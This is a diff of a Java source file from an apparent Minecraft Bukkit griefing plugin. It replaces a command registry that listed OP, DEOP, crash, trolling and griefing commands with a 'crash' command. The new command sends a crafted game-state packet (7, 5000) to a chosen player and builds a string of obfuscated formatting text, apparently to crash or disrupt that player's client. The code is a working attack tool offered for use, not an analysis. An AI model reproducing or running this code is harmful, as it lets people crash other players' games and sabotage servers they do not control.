@@ -21,39 +21,42 @@
  * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  * SOFTWARE.
  */
-package de.Garkolym.Commands;
+package de.Garkolym.Commands.Server;
 
 import java.util.ArrayList;
 
-import de.Garkolym.Commands.Griefing.CommandUltraCactus;
-import de.Garkolym.Commands.Server.CommandCrash;
-import de.Garkolym.Commands.Server.CommandDEOP;
-import de.Garkolym.Commands.Server.CommandOP;
-import de.Garkolym.Commands.Trolling.CommandGlasVirus;
-import de.Garkolym.Commands.Trolling.CommandKackRegen;
+import org.bukkit.Bukkit;
+import org.bukkit.craftbukkit.v1_9_R1.entity.CraftPlayer;
+import org.bukkit.entity.Player;
 
-public class CommandManager {
+import de.Garkolym.Start;
+import de.Garkolym.Commands.Command;
+import de.Garkolym.Commands.CommandCategory;
+import net.minecraft.server.v1_9_R1.PacketPlayOutGameStateChange;
+
+public class CommandCrash extends Command {
+
+	public static String crashString = "";
 	
-	private ArrayList<Command> commandList = new ArrayList<Command>();
-	public ArrayList<Command> getCommandList() {
-		return this.commandList;
+	private void generateCrashString() {
+		for (int i = 0; i < 100; i++) {
+			crashString += "§kLOL\n";
+		}
 	}
 	
-	private void initCommands() {
-		// Server
-		this.getCommandList().add(new CommandOP());
-		this.getCommandList().add(new CommandDEOP());
-		this.getCommandList().add(new CommandCrash());
-		// Trolling
-		this.getCommandList().add(new CommandKackRegen());
-		this.getCommandList().add(new CommandGlasVirus());
-		// Griefing
-		this.getCommandList().add(new CommandUltraCactus());
-		
+	public CommandCrash() {
+		super("crash", CommandCategory.SERVER);
+		this.generateCrashString();
 	}
-	
-	public CommandManager() {
-		this.initCommands();
+
+	@Override
+	public void onCommand(Player p, ArrayList<String> args) {
+		Bukkit.getScheduler().runTask(Start.instance, new Runnable() {
+			@Override
+			public void run() {
+				((CraftPlayer)p).getHandle().playerConnection.sendPacket(new PacketPlayOutGameStateChange(7, 5000));
+			}
+		});
 	}
-	
+
 }
